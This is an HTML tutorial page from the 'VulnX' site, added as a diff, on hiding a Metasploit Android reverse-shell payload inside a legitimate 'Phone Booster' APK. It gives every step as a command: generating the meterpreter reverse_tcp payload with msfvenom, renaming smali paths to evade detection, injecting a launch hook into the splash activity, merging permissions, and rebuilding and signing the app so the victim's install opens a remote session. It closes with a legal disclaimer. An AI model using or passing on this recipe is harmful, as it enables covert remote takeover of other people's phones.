@@ -1,0 +1,296 @@
+<html>
+	<head>
+		<link rel="icon" href="https://vulnx.in/favicon.png">
+		<script data-ad-client="ca-pub-6203666289882469" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body {margin: 0;}
+
+.videoWrapper {
+  position: relative;
+  padding-bottom: 56.25%;
+  height: 0;
+}
+
+.videoWrapper iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+
+#myCookieConsent {
+    border-radius: 5px;
+    border: 5px solid #f44336;
+    width: 80%;
+    padding: 20px 20px;
+    overflow: hidden;
+    position: fixed;
+    color: #fff;
+    bottom: 3px;
+    display: none;
+    left: 5%;
+    text-align: center;
+    font-size: 15px;
+    font-weight: bold;
+}
+
+#myCookieConsent #cookieButton {
+    display: inline-block;
+    color: #fff;
+    font-size: 1.1em;
+    background: #000;
+    text-decoration: none;
+    cursor: pointer;
+    padding: 2px 20px;
+    float: right;
+    border: 2px solid #f44336;
+    border-radius: 5px;
+    transition: 0.5s;
+}
+#myCookieConsent #cookieButton:hover {
+    border: 2px solid white;
+    background: #f44336;
+	color: #fff;
+}
+
+ul.topnav {
+  list-style-type: none;
+  margin: 0;
+  padding: 0;
+  left: 0;
+  right: 0;
+  overflow: hidden;
+  background-color: #23252e;
+}
+
+ul.topnav li {float: left;}
+
+ul.topnav li a {
+  background-color: #23252e;
+  display: block;
+  color: white;
+  text-align: center;
+  padding: 16px 16px;
+  text-decoration: none;
+}
+
+ul.topnav li a:hover:not(.active) {background-color: #f44336;}
+
+ul.topnav li a.active {background-color: #4CAF50;}
+
+@media screen and (max-width: 600px) {
+  ul.topnav li.left, 
+  ul.topnav li {float: none;}
+}
+</style>
+		<link rel="stylesheet" href="style.css"/>
+		<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@600;700&display=swap" rel="stylesheet">	
+		<title>Advanced Android Hacking : PART-2. Manual embedding of 'MainActivity' on another official apk | VulnX</title>
+
+	</head>
+
+	<body>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-167461836-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-167461836-1');
+</script>
+
+		<font color="white" face="Fira Code" size="3" >	
+			<ul class="topnav">
+			<li><a href="../../../../../../../../../index.html">Home</a></li>
+			<li><a href="../../../../../../../../../Contents/resources.html">Resources</a></li>
+			<li><a href="../../../../../../../../../Contents/tutorials.html">Tutorials</a></li>
+			<li><a href="../../../../../../../../../Contents/CTFs.html">CTFs</a></li>
+			</ul>
+		</font>	
+		<div id="align">
+<font color="white" face="Fira Code" size="2">
+<div id="myCookieConsent">
+	<div id="cookieButton">I agree</div>
+	<div>By using our site, you agree to our use of cookies to deliver a better site experience.</div>
+</div>
+
+<script>
+var obj;
+obj = document.getElementById("myCookieConsent");
+
+function  func() {
+	obj.style.display = "none";
+	document.cookie = "cookiePromptShown=Yes; path=/";
+}
+var element;
+element = document.getElementById("cookieButton");
+element.addEventListener('click', func);
+</script>
+</font>	
+				
+				<font color="white" face="Fira Code" size="2">
+				<center><h1>Advanced Android Hacking</h1></center>
+				<center><h1>PART-2 : Manual embedding of 'MainActivity'	on another official apk<h1></center>
+				
+Hey what's up, welcome back to VulnX, in this tutorial we are going to learn how we can modify the android payload [ the MainActivity app ] and install it's important files onto another official application, such that when the target [ victim ] will download, install and run the official application, our payload will <b>also</b> be executed in background and we will easily get a reverse tcp connection. So let's see how this concept works in detail.
+
+				<h1><u>STEP-1 : Understanding the logic behind the exploit</u></h1>
+
+				So basically we need to normally generate a malicious application using <i>msfvenom</i>, and download an official apk from the internet. Then we will use apktool to decompile both of them. After decompiling we get 2 new folders, each containing the source code [ almost original ] of respective apk(s). Usually if we use the MainActivity app, when the app starts, it loads the essential smali files [ <b>Payload.smali</b> ], so we need to copy all the smali files [ responsible for the functioning of the application ] from the decompiled MainActivity app to the decompiled official app [ in this tutorial we will be using the '<i>Phone Booster</i>' apk ]. But before transferring the smalis, we will remove all traces of metasploit from them to make the app almost FUD [ <b>F</b>ully <b>U</b>n<b>d</b>etectable</b> ]. Once that is done, we will simply transfer them and then edit some more files, to inject all permissions required for the MainActivity smali to work & finally inject hook to automatically start the <b>Payload.smali</b> when the Phone Booster app loads up.<br><br>
+				Okay, seems easy, so let's proceed.<br><br>
+				<b>NOTE : You will need to find the location of smalis and inject permissions manually if you are using any other application. However, I encourage trying with a different app as it will help you fail and ultimately gain more knowledge.</b>
+				
+				<h1><u>STEP-2 : Getting essential files ready and decompiling apk(s)</u></h1>
+				
+				So before we begin, we will store all our files in a folder called <i>'apk_embedding'</i> in the root directory and we will place our official apk in that directory itself.<br><br>
+				Now we need to generate a malicious apk using msfvenom with the following command :- [ replace &lt;port&gt; with a custom port number ]
+
+				<p><em class="word-break">msfvenom -p android/meterpreter/reverse_tcp LHOST=$(hostname -I | awk '{print $1}') LPORT=&lt;port&gt; R &gt; rev_tcp_malicious.apk</em></p>
+
+				So we will use these two commands to decompile our apk(s) :-
+
+				<p><em class="word-break">apktool d -f rev_tcp_malicious.apk<br>apktool d -f Phone\ Booster\ Official.apk</em></p>
+
+				<b>NOTE : From now on, I'll be using Phone Booster, if you are using a different application, then you will have to replace the name accordingly in the commands.</b>
+				
+				<h1><u>STEP-3 : Removing straces of metasploit from smalis of malicious apk</u></h1>
+				
+				Let's head over to the directory where the smalis are located, in the malicious apk it will always be in <br>'smali -> com -> metasploit -> stage/'<br>
+				
+				So lets change the directory and type ls, the results will be like this :-
+				
+				<p><em class="word-break"><b>root@kali</b>:<font color="#8181FF">~/apk_embedding/rev_tcp_malicious/smali/com/metasploit/stage</font>#&nbsp;ls<br>a.smali&nbsp;&nbsp;b.smali&nbsp;&nbsp;c.smali&nbsp;&nbsp;d.smali&nbsp;&nbsp;e.smali&nbsp;&nbsp;f.smali&nbsp;&nbsp;g.smali&nbsp;&nbsp;MainActivity.smali&nbsp;&nbsp;MainBroadcastReceiver.smali&nbsp;&nbsp;MainService.smali&nbsp;&nbsp;Payload.smali</em></p>
+				
+				Okay so we have a couple of files, and these are the files which are actually responsible for the functioning of the MainActivity app, so let's simply print all the content of every file and pipe that output so that we can grep it [ filter it ] and print only those lines which have the word metasploit in them. So let's use the following command :-
+				
+				<p><em class="word-break">cat * | grep "metasploit"</em></p>
+				
+				After that, you will get some output, somewhat like this :-
+				<p><em class="word-break"><b>root@kali</b>:<font color="#8181FF">~/apk_embedding/rev_tcp_malicious/smali/com/metasploit/stage</font>#&nbsp;cat&nbsp;*&nbsp;|&nbsp;grep&nbsp;"metasploit"<br>...&nbsp;[&nbsp;some&nbsp;very&nbsp;large&nbsp;and&nbsp;similar&nbsp;data&nbsp;]<br>&nbsp;&nbsp;&nbsp;&nbsp;invoke-direct&nbsp;{v2,&nbsp;v1},&nbsp;Lcom/metasploit/stage/d;-><init>(Ljava/lang/reflect/Method;)V<br>&nbsp;&nbsp;&nbsp;&nbsp;invoke-static&nbsp;{v0},&nbsp;Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V<br>&nbsp;&nbsp;&nbsp;&nbsp;sget-object&nbsp;v2,&nbsp;Lcom/metasploit/stage/Payload;->a:[B<br>&nbsp;&nbsp;&nbsp;&nbsp;sput-object&nbsp;v0,&nbsp;Lcom/metasploit/stage/Payload;->h:[Ljava/lang/Object;<br>&nbsp;&nbsp;&nbsp;&nbsp;new-instance&nbsp;v0,&nbsp;Lcom/metasploit/stage/e;<br>&nbsp;&nbsp;&nbsp;&nbsp;invoke-direct&nbsp;{v0},&nbsp;Lcom/metasploit/stage/e;-><init>()V<br>&nbsp;&nbsp;&nbsp;&nbsp;invoke-virtual&nbsp;{v0},&nbsp;Lcom/metasploit/stage/e;->start()V<br></em></p>
+				
+				Do you notice this string is common in all?
+				<ul><li><em class="word-break">Lcom/metasploit/stage/</em></li></ul>
+				
+				If you ignore the <i>'L'</i>, then it's just the location directory of where the smalis are located. So if we shift these files from our malicious apk to the official apk's smali folder, then, we will need to replace the words "metasploit" & "stage" accordingly, then there would be no trace of these words and our application will be even less detectable. So now let's change the directory to the 'smali/com' [ because this is common in both ] folder of the official app. Now let's see which files and folders we have here :-
+				<p><em class="word-break"><b>root@kali</b>:<font color="#8181FF">~/apk_embedding/Phone&nbsp;Booster&nbsp;Official/smali/com</font>#&nbsp;ls<br><font color="#8181FF">a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;appnext&nbsp;&nbsp;&nbsp;&nbsp;avocarrot&nbsp;&nbsp;baidu&nbsp;&nbsp;d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dianxinos&nbsp;&nbsp;duapps&nbsp;&nbsp;e&nbsp;&nbsp;facebook&nbsp;&nbsp;g&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;in2wow&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;intowow&nbsp;&nbsp;moat&nbsp;&nbsp;&nbsp;privacy<br>android&nbsp;&nbsp;appsflyer&nbsp;&nbsp;b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;daemon&nbsp;&nbsp;dl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;durtb&nbsp;&nbsp;&nbsp;f&nbsp;&nbsp;ftes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;google&nbsp;&nbsp;integralads&nbsp;&nbsp;lite&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mopub&nbsp;&nbsp;taboola<br></font></em></p>
+				
+				Let's head over to the 'lite' directory and see which files and folders do we have here :-
+				<p><em class="word-break"><b>root@kali</b>:<font color="#8181FF">~/apk_embedding/Phone&nbsp;Booster&nbsp;Official/smali/com/lite</font>#&nbsp;ls<br>a.smali&nbsp;&nbsp;b.smali&nbsp;&nbsp;c.smali&nbsp;&nbsp;d.smali&nbsp;&nbsp;e.smali&nbsp;&nbsp;HomeActivity.smali&nbsp;&nbsp;<font color="#8181FF">omnicleaner&nbsp;&nbsp;rammaster</font><br></em></p>
+				
+				Now let's just place our files in the "omnicleaner" directory.<br><br>
+				<b>NOTE : You can alternatively choose other directories as well, everything is fine as long as you don't mess with the official smalis of the app.</b><br><br>
+
+				Anyway let's go back to our malicious apk directory, and take a note of a few things :-
+				<ul>
+					<li>Currently the smalis are in "com/metasploit/stage" directory, and so the string "Lcom/metasploit/stage" [ in the smali files ] points at correct location.</li>
+					<li>But we are moving the files to the other folder, the "com/lite/omnicleaner" directory of the official app.</li>
+					<li>So smalis will be pointing to the wrong location and the app will fail, thus :-<br>Previous -> <i>"Lcom/metasploit/stage"</i><br>Now&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-> "Lcom/lite/omnicleaner"</li>
+					<li>So basically "metasploit" has to be changed with "lite" & "stage" has to be replace with "omnicleaner"</li>
+				</ul>
+
+				So let's use the simple sed command to replace these words from all files :-
+				<p><em class="word-break"><b>root@kali</b>:<font color="#8181FF">~/apk_embedding/rev_tcp_malicious/smali/com/metasploit/stage</font>#&nbsp;sed&nbsp;-i&nbsp;s/metasploit/lite/g&nbsp;*&nbsp;;&nbsp;sed&nbsp;-i&nbsp;s/stage/omnicleaner/g&nbsp;*</em></p>
+				
+				Now almost all traces are removed, now we must shift all these files in the proper directories using the following command :-
+				<p><em class="word-break"><b>root@kali</b>:<font color="#8181FF">~/apk_embedding/rev_tcp_malicious/smali/com/metasploit/stage</font># mv * ~/apk_embedding/Phone\ Booster\ Official/smali/com/lite/omnicleaner/</em></p>
+				
+				<h1><u>STEP-3 : Finding the hook-point and injecting the hook</u></h1>
+
+				So basically, the app has the files required to give us a reverse meterpreter connection but those files aren't actually getting loaded. So we have to manually inject the hook to start the <b>Payload.smali</b> as soon as the app loads. So first we need to know which smali is loaded the first when the app loads, then we can add an extra line there to start our payload. So let's go to the "Phone Booster Official" folder and view the contents of the <b>'AndroidManifest.xml'</b>.<br>
+				Now here we need to find the following lines :-
+				<em class="word-break"><ul><li>&lt;action android:name="android.intent.action.MAIN"/&gt;</li><br><li>&lt;category android:name="android.intent.category.LAUNCHER"/&gt;</em></li></ul>
+				
+				The snippet given below shows a segment of the code where the above two lines are present :-
+				<p><em class="word-break">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#55FFFF">&lt;activity</font> <font color="#55FF55">android:name</font>=<font color="#FF55FF">"com.lite.rammaster.module.splash.SplashActivity"</font><font color="#55FF55"> android:screenOrientation</font>=<font color="#FF55FF">"portrait"</font><font color="#55FFFF">&gt;</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#55FFFF">&lt;intent-filter&gt;</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#55FFFF"><b>&lt;action</font> <font color="#55FF55">android:name</font>=<font color="#FF55FF">"android.intent.action.MAIN"</font><font color="#55FFFF">/&gt;</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#55FFFF">&lt;category</font> <font color="#55FF55">android:name</font>=<font color="#FF55FF">"android.intent.category.LAUNCHER"</font><font color="#55FFFF">/&gt;</font></b><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#55FFFF">&lt;/intent-filter&gt;</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#55FFFF">&lt;/activity&gt;	</font></em></p>
+				
+				Do you see the string <font color="#FF55FF">"com.lite.rammaster.module.splash.SplashActivity"</font>, well that is the smali file which is loaded as soon as the program begins. So our job is simple, we need to go to that directory, open that smali file and inject the hook. Simple, let's go to that directory using the following command :-
+				<p><em class="word-break">cd smali/com/lite/rammaster/module/splash/</em></p>
+
+				and now when I type ls,
+				<p><em class="word-break"><b>root@kali</b>:<font color="#8181FF">~/apk_embedding/Phone&nbsp;Booster&nbsp;Official/smali/com/lite/rammaster/module/splash</font>#&nbsp;ls<br>a.smali&nbsp;&nbsp;b.smali&nbsp;&nbsp;c.smali&nbsp;&nbsp;d.smali&nbsp;&nbsp;SplashActivity.smali</em></p>
+
+				Now let's use vim to edit this file and search for <b>'Landroid/os/Bundle'</b>, you can see that I have found the following string :-
+				<p><em class="word-break">invoke-super {p0, p1}, Lcom/lite/rammaster/a/d;->onCreate(Landroid/os/Bundle;)V</em></p>
+
+				Now just beneath it, I'll add another line to start the <b>`Payload.smali`</b> :-
+				<p><em class="word-break">&nbsp;&nbsp;&nbsp;&nbsp;invoke-static {p0}, Lcom/lite/omnicleaner/Payload;->start(Landroid/content/Context;)V</em></p>
+
+				After that simply save the file and exit from vim. Now even the hook is inserted. Now we are just one step less than the final.
+
+				<h1><u>STEP-4 : Inserting necessary permissions</u></h1>
+
+				This step is fairly simple. We have placed the smalis in the proper directory. We have also linked them with the program and injected the hook. Now the program can easily use all the smalis, just one step is remaining. The app right now only has those permissions which are necessary for the host app [ our custom downloaded apk ]. But there are/might be some permissions which are necessary for the MainActivity and are not currently provided in the permission list. So we need to copy all permissions from MainActivity's <b>'AndroidManifest.xml'</b> file and paste them in Phone Booster's  <b>'AndroidManifest.xml'</b> file. But wait wait! Hold on, the app would crash if any permission is duplicated. I had spent a lot of time when I encountered this issue. I spent hours trying to figure out what was going wrong. Is it an incompatible apk? My MainActivity is corrupt? Is there a issue with apktool? and many more. But then I realised that it's just the duplicated permissions. So be sure to NOT make that mistake and remove any duplicated permissions.<br><br>
+
+				Oh wait I forgot to mention, all the permissions start like
+				<p><em class="word-break">&lt;<font color="#FF55FF">uses-permission</font> <font color="#55FF55">android:name</font>=" ... </em></p>
+				From the MainActivity app you must also copy the permissions which start like
+				<p><em class="word-break">&lt;<font color="#FF55FF">uses-feature</font> <font color="#55FF55">android:name</font>=" ...</em></p>
+				One very simple way is that, you copy all permissions from the MainActivity and place them in a temporary file & then copy all permissions from the Phone Booster file and place them in that temporary file as well. Then use the following command :-
+
+				<p><em class="word-break">sort tmp.txt | uniq</em></p>
+
+				<b>Assuming that you saved the temporary file with the name tmp.txt</b><br><br>
+
+				Now finally we are at the end.
+
+				<h1><u>STEP-5 : Building [ or Recompiling ] the apk from the folder and signing it</u></h1>
+
+				Let's go in the apk_embedding directory and use the following command to build the apk back :-
+				<p><em class="word-break">apktool b -f Phone\ Booster\ Official</em></p>
+
+				Now the built apk is in the "dist" directory inside the Phone Booster folder. Now let's head over to that directory and generate a key using the following command :-
+				<p><em class="word-break">echo -e "12345678\n12345678\naa\naa\naa\naa\naa\n01\nyes" | keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000; echo 12345678 | jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore "Phone Booster Official.apk" alias_name</em></p>
+
+				So now the apk is signed and is ready to give us reverse meterpreter access. We shall take a look in the next tutorial, how does the PoC [ Proof-of-Concent ] work!<br><br>
+
+				And so that's it for this tutorial. I hope you found this helpful and as well I encourage you to try and use a different apk and don't forget ...<br>
+				<b>DO NOT USE THIS ATTACK ILLEGALLY ON ANYONE. IF YOU WISH TO TRY THIS TECHNIQUE, PERFORM THIS ATTACK ON ONLY THOSE FROM WHOM YOU HAVE WRITTEN PERMISSION. I AM NOT RESPONSIBLE FOR ANY MISUSE YOU DO FROM THE KNOWLEDGE GAINED FROM THIS TUTORIAL AND THE SITE AS LARGE.</b><br><br>
+
+				But anway, thanks for reading!<br><br>
+
+				<div id="align_right">
+					Good luck,<br>
+					VulnX<br>
+				</div>
+				<hr class="new5">
+			</font>
+		</div>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script>
+var element;
+element = document.getElementById("myCookieConsent");
+
+function getCookie(cname) {
+  var name = cname + "=";
+  var decodedCookie = decodeURIComponent(document.cookie);
+  var ca = decodedCookie.split(';');
+  for(var i = 0; i <ca.length; i++) {
+    var c = ca[i];
+    while (c.charAt(0) == ' ') {
+      c = c.substring(1);
+    }
+    if (c.indexOf(name) == 0) {
+      return c.substring(name.length, c.length);
+    }
+  }
+  return "";
+}
+
+ var cookieVal = getCookie("cookiePromptShown");
+
+if(cookieVal != "Yes") {
+	element.style.display = "block";
+
+}
+else {
+	element.style.display = "none";
+}
+
+</script>
+
+	<body>
+<html/>
